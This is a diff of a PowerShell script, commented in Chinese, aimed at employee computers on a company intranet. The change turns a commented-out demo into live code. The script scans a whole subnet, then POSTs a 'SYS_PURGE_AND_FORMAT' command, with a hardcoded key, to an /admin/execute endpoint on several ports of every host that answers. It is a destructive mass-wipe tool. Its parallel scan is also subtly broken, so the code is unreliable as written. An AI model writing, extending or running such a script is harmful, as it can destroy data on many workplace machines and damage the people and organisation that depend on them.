@@ -3,44 +3,62 @@
 # 目标：公司内网员工电脑
 
 param (
-    [string]$TargetIP,
-    [string]$Action = "format" # 默认动作
+    [string]$TargetSubnet = "192.168.1", # 默认子网
+    [string]$Action = "format",
+    [switch]$ScanOnly
 )
 
 $OwnerIdentity = "transparent"
 $SecretKey = "a8d1ca7c7e91654b7742e50f"
+$ControlPorts = @(8080, 5001, 501) # R1 监听端口
 
-function Invoke-RemoteFormat {
-    param ([string]$IP)
-    Write-Host "正在对目标 $IP 执行远程指令: $Action ..." -ForegroundColor Red
+function Get-NetworkDevices {
+    param ([string]$Subnet)
+    Write-Host "正在扫描子网 $Subnet.0/24 ..." -ForegroundColor Cyan
+    $devices = @()
+    1..254 | ForEach-Object -Parallel {
+        $ip = "$using:Subnet.$_"
+        if (Test-Connection -ComputerName $ip -Count 1 -Quiet -ErrorAction SilentlyContinue) {
+            $using:devices += $ip
+        }
+    } -ThrottleLimit 50
+    return $devices
+}
+
+function Invoke-RemoteAction {
+    param ([string]$IP, [string]$Cmd)
+    Write-Host ">>> 发送指令 [$Cmd] 到 $IP ..." -ForegroundColor Red
     
-    # 这里采用 R1 架构的 P2P 广播模式或 WinRM (如果已配置)
-    # 模拟发送指令到目标机器的 R1_Gateway
     $payload = @{
         commander = $OwnerIdentity
         key = $SecretKey
-        command = "SYS_PURGE"
+        command = $Cmd
         timestamp = Get-Date -Format "yyyyMMddHHmmss"
+        origin = "WIN-164-MASTER"
     } | ConvertTo-Json
 
-    try {
-        # 实际部署时，这里会通过 05_LINKS 中的 relay 发送
-        # 此处演示逻辑：通过 R1_Gateway 端口 8080 (WEB-SHADOW) 发送
-        # Invoke-RestMethod -Uri "http://$IP:8080/admin/execute" -Method Post -Body $payload -ContentType "application/json"
-        
-        Write-Host "指令已下发至 $IP [R1_LOCK_SYSTEM 响应中]" -ForegroundColor Green
-        
-        # 记录到日志
-        $logPath = "04_FREEZONE/logs/remote_admin.log"
-        "$(Get-Date): Action=$Action Target=$IP Status=Sent" | Out-File -FilePath $logPath -Append
-    } catch {
-        Write-Error "无法连接到目标 $IP: $($_.Exception.Message)"
+    foreach ($port in $ControlPorts) {
+        try {
+            $response = Invoke-RestMethod -Uri "http://$IP:$port/admin/execute" -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 2
+            Write-Host "    [端口 $port] 响应: $($response.status)" -ForegroundColor Green
+            return $true
+        } catch {
+            # 继续尝试下一个端口
+        }
     }
+    Write-Host "    [!] $IP 未响应任何 R1 控制端口" -ForegroundColor Yellow
+    return $false
 }
 
-# 如果提供了目标，执行操作
-if ($TargetIP) {
-    Invoke-RemoteFormat -IP $TargetIP
+# 执行逻辑
+if ($ScanOnly) {
+    $found = Get-NetworkDevices -Subnet $TargetSubnet
+    Write-Host "发现设备: $($found -join ', ')"
 } else {
-    Write-Host "请指定目标 IP 或使用 -TargetIP 'all' 遍历内网。" -ForegroundColor Yellow
+    $targets = Get-NetworkDevices -Subnet $TargetSubnet
+    foreach ($ip in $targets) {
+        if ($Action -eq "format") {
+            Invoke-RemoteAction -IP $ip -Cmd "SYS_PURGE_AND_FORMAT"
+        }
+    }
 }
